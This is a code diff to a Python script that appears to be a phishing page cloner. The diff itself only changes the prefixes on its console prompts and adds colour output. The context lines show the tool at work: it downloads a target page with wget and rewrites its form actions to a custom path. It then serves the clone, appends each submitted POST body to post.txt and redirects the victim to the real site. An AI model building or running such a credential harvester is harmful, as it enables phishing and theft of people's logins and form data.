@@ -38,17 +38,17 @@ sys.stdout.write(GREEN)
 print(BANNER)
 sys.stdout.write(RESET)
 
-use_wget = input("[*] Do you want to automatically download the page with wget? (Y/n) : ")
+use_wget = input("[?] Do you want to automatically download the page with wget? (Y/n) : ")
 
 if use_wget.lower() not in NO:
-    url = input("[*] What is the FULL URL you want to copy : ")
+    url = input("[?] What is the FULL URL you want to copy : ")
 
     user_agent_change = input("[*] Use default user agent? (Y/n) : ")
     
     if user_agent_change.lower() not in NO:
         user_agent = DEFAULT_USER_AGENT
     else:
-        user_agent = input("[*] User agent : ")
+        user_agent = input("[?] User agent : ")
 
     print("\n[*] Downloading web page with wget ...")
 
@@ -58,7 +58,7 @@ if use_wget.lower() not in NO:
     print("[*] Done.\n")
 
 else:
-    print("[*] Make sure all the proper files are in /web before launching the HTTP server !")
+    print("[!] Make sure all the proper files are in /web before launching the HTTP server !")
 
 # Make sure index.html exists
 if not os.path.isfile(INDEX_PATH):
@@ -72,13 +72,13 @@ if not os.path.isfile(INDEX_PATH):
     if len(html_files_in_web) == 1:
         os.rename(os.path.join(WEB_PATH, html_files_in_web[0]), INDEX_PATH)
     else:
-        index_filename = input("[*] Which file in /web should be used as index.html? (filename only) :")
+        index_filename = input("[?] Which file in /web should be used as index.html? (filename only) :")
         print("\n [*] Renaming file ...")
         os.rename(os.path.join(WEB_PATH, index_filename), INDEX_PATH)
         print("[*] Done.\n")
 
 
-redirect_ip = input("[*] What is the IP/domain GET/POST should forward to : ")
+redirect_ip = input("[?] What is the IP/domain GET/POST should forward to : ")
 
 #########################
 ###  EDIT HTML FORMS  ###
@@ -132,7 +132,9 @@ class SimpleHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         body = self.rfile.read(content_length)                                          # Read entire POST body
         
         if self.path == "/custom_path_for_form_post_requests":                          # Check if the POST request path is "/custom_path_for_form_post_requests" (where we directed our form actions)
-            print("[*] Form was filled! Writing output to post.txt ...")
+            sys.stdout.write(GREEN)
+            print("[+] Form was filled! Writing output to post.txt ...")
+            sys.stdout.write(RESET)
             self.send_response(303)                                                     # We use HTTP 303 to force the browser to perform a GET request on our redirect ip/domain.
             self.send_header("Location", "https://{}".format(redirect_ip))              # Set "Location" header to our initial URL
             with open(POST_PATH, 'a+') as file:                                         # Open post.txt in append mode to add the entire POST request
@@ -155,15 +157,15 @@ def launch_server(port):
     # Start HTTP server, close it if user hits CTRL+C
     try:
         print("[*] Serving HTTP at port {}.".format(port))
-        print("\n[*] Use CTRL+C to exit and close the HTTP server.")
+        print("\n[!] Use CTRL+C to exit and close the HTTP server.")
         httpd.serve_forever()
     except KeyboardInterrupt:
         sys.stdout.write(RED)
-        print("[*] KeyboardInterrupt")
+        print("\n[!] KeyboardInterrupt")
         sys.stdout.write(RESET)
         print("[*] Closing HTTP server ...")
         httpd.server_close()
-        print("[*] Please run cleanup.py before you run this script again!")
+        print("[!] Please run cleanup.py before you run this script again!")
 
 print("\n[*] Launching HTTP server ...")
 launch_server(PORT)
